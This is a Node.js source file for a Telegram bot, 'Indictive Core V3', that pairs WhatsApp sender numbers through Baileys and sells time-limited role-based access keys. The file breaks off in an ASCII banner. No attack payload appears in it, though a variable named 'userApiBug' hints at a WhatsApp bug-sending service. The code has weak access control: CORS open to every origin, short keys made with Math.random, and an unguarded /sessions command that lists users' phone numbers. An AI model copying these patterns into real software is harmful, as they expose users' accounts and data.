const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
    const countryCodes = {
        '1': 'US/Canada',
        '44': 'UK',
        '33': 'France',
        '49': 'Germany',
        '39': 'Italy',
        '34': 'Spain',
        '7': 'Russia',
        '81': 'Japan',
        '82': 'South Korea',
        '86': 'China',
        '91': 'India',
        '62': 'Indonesia',
        '60': 'Malaysia',
        '63': 'Philippines',
        '66': 'Thailand',
        '84': 'Vietnam',
        '65': 'Singapore',
        '61': 'Australia',
        '64': 'New Zealand',
        '55': 'Brazil',
        '52': 'Mexico',
        '57': 'Colombia',
        '51': 'Peru',
        '54': 'Argentina',
        '27': 'South Africa'
    };

    for (const [code, country] of Object.entries(countryCodes)) {
        if (phoneNumber.startsWith(code)) {
            return country;
        }
    }
    
    return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);
          
          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 Indictive Core V3</blockquote>
<i>Now DictiveCore has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @AiiSigma</b>
<b>Version   : 3 ⧸ <code>III</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Settings Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Settings Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Indictive Core V3</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/N3xithCore") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Indictive Core V3</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @AiiSigma for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/N3xithCore") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/AiiSigma");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/N3xithCore");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Indictive Core V3</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/N3xithCore") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Indictive Core V3</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @AiiSigma for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄 𝐂𝐎𝐑𝐄", "https://t.me/N3xithCore") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🍁 Indictive Core V3</blockquote>
<i>Now DictiveCore has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @AiiSigma</b>
<b>Version   : 3 ⧸ <code>III</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey indictive,3d,admin\n• /ckey user1,7d,reseller\n• /ckey user2,1d,user\n\nRole: owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /ckey di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠄⢂⠀⠀⠀⠀⠀⣀⣠⠠⢖⣋⡥⢖⣩⠔⠊⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣨⠭⢵⣒⣩⠬⢖⠏⠁⢀⣀⠀⠀⠀
⠀⠀⠈⠓⠒⠦⠍⠭⠭⣭⠭⠭⠭⠭⡿⡓⠒⠛⠉⠉⠀⠀⣠⠇⠀⠀⠘⠞⠀⠀⠀
